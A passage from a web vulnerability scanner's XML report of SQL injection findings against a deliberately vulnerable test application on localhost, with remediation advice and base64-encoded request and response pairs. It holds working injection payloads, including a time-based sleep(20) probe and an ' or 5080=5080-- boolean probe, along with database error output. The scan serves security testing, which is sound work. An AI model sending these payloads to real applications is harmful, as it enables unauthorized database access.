      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODgNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDggLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgc2VydmVyIE1BQyBhZGRyZXNzLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3906982255852950528</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case09-InjectionInSearch-RetrievePrivilegesOnDatabase-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case09-InjectionInSearch-RetrievePrivilegesOnDatabase-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA5LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlUHJpdmlsZWdlc09uRGF0YWJhc2UtVW5pb25FeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULVVuaW9uRXhwbG9pdC9DYXNlMDktSW5qZWN0aW9uSW5TZWFyY2gtUmV0cmlldmVQcml2aWxlZ2VzT25EYXRhYmFzZS1VbmlvbkV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA5LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlUHJpdmlsZWdlc09uRGF0YWJhc2UtVW5pb25FeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULVVuaW9uRXhwbG9pdC9DYXNlMDktSW5qZWN0aW9uSW5TZWFyY2gtUmV0cmlldmVQcml2aWxlZ2VzT25EYXRhYmFzZS1VbmlvbkV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDkgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgcHJpdmlsZWdlcyBvbiBhIGRhdGFiYXNlLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA5LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlUHJpdmlsZWdlc09uRGF0YWJhc2UtVW5pb25FeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULVVuaW9uRXhwbG9pdC9DYXNlMDktSW5qZWN0aW9uSW5TZWFyY2gtUmV0cmlldmVQcml2aWxlZ2VzT25EYXRhYmFzZS1VbmlvbkV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDkgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgcHJpdmlsZWdlcyBvbiBhIGRhdGFiYXNlLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7469173253225144320</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>78824092' or 5080=5080-- </b> was submitted in the msg parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci1FeHBlcmltZW50YWwvQ2FzZTAxLUluamVjdGlvbkluSW5zZXJ0VmFsdWVzLVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlL